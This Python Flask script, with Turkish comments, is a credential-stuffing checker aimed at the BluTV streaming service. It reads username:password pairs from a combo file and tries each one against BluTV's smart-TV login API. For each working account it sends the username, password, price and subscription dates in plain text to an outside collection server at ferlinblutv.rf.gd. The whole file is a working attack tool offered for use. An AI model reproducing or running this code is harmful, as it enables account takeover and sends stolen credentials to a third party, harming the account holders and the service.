import random
import requests
import json
from datetime import datetime
from termcolor import colored
from flask import Flask

app = Flask(__name__)

@app.route('/')
def check_accounts():
    # Rastgele sayı oluşturma
    rnd = random.randint(100, 999)
    rnd2 = random.randint(100, 999)

    # Combo dosyası
    combo_file_path = "combo.txt"  # Otomatik olarak bu dosyayı kullanacak

    # Türkiye tarihini al
    turkey_time_now = datetime.now().astimezone().strftime("%Y-%m-%d")

    try:
        with open(combo_file_path, 'r', encoding='utf-8', errors='ignore') as combo_file:
            combo_lines = combo_file.readlines()

        results = []  # Sonuçları burada tutacağız

        for line in combo_lines:
            if ':' in line:
                username, password = line.strip().split(':')
            else:
                continue

            # API ayarları
            url = "https://smarttv.blutv.com.tr/actions/account/login"
            headers = {
                "accept": "application/json, text/javascript, */*; q=0.01",
                "accept-encoding": "gzip, deflate, br",
                "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
                "user-agent": f"Mozilla/5.0 (Windows; Windows NT 6.1; x64; en-US) Gecko/20100101 Firefox/61.5"
            }

            data = {
                "username": username,
                "password": password,
                "platform": "com.blu.smarttv"
            }

            response = requests.post(url, headers=headers, data=data)

            if response.status_code == 200:
                source = response.text
                if "status\":\"ok" in source:
                    parsed_data = json.loads(source)

                    # Tarihleri al
                    start_date_raw = parsed_data.get('user', {}).get('StartDate')
                    end_date_raw = parsed_data.get('user', {}).get('EndDate')
                    price = parsed_data.get('user', {}).get('Price')  # Fiyat bilgisini al

                    # Tarihleri kontrol et
                    start_date = datetime.strptime(start_date_raw, "%Y-%m-%dT%H:%M:%S%z").strftime("%Y-%m-%d") if start_date_raw else 'Bilinmiyor'
                    end_date = datetime.strptime(end_date_raw, "%Y-%m-%dT%H:%M:%S%z").strftime("%Y-%m-%d") if end_date_raw else 'Null'

                    if end_date != 'Null' and end_date < turkey_time_now:
                        print(colored(f"!Custom Hesap! - {username}", "yellow"))
                        result = f"Kullanıcı Adı: {username}/nŞifre: {password}/nFiyat: {price}/nBaşlangıç Tarihi: {start_date}/nBitiş Tarihi: {end_date} (Süresi Geçmiş!)"
                    else:
                        print(colored(f"! Hit Çıktı! - {username}", "green"))
                        result = f"Kullanıcı Adı: {username}/nŞifre: {password}/nFiyat: {price}/nBaşlangıç Tarihi: {start_date}/nBitiş Tarihi: {end_date}"

                        # API isteği at
                        api_url = f"http://ferlinblutv.rf.gd/api.php?ekle={result}&i=1"
                        api_headers = {
                            "User-Agent": "Mozilla/5.0 (Windows; Windows NT 6.1; x64; en-US) Gecko/20100101 Firefox/61.5"
                        }
                        api_response = requests.get(api_url, headers=api_headers)

                        # API yanıtını kontrol et
                        api_data = api_response.json()
                        if api_data.get("status") == "success":
                            print("Veri başarıyla eklendi.")
                        else:
                            print(colored(f"Hata: {api_data.get('message', 'Bilinmeyen hata')}", "red"))

                    # Kullanıcı adı ve şifreyi yazdır
                    print(f"{username}:{password}")

                else:
                    print(colored(f"Yanlış Hesap: {username}:{password}", "red"))

        return "\n".join(results)  # Sonuçları döndür

    except FileNotFoundError:
        return "Dosya bulunamadı. Lütfen doğru dosya konumunu kontrol edin."
    except json.JSONDecodeError:
        return "API yanıtı çözümlenemedi. Lütfen API'yi kontrol edin."

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=8080)  # Burada güncelleme yapıldı
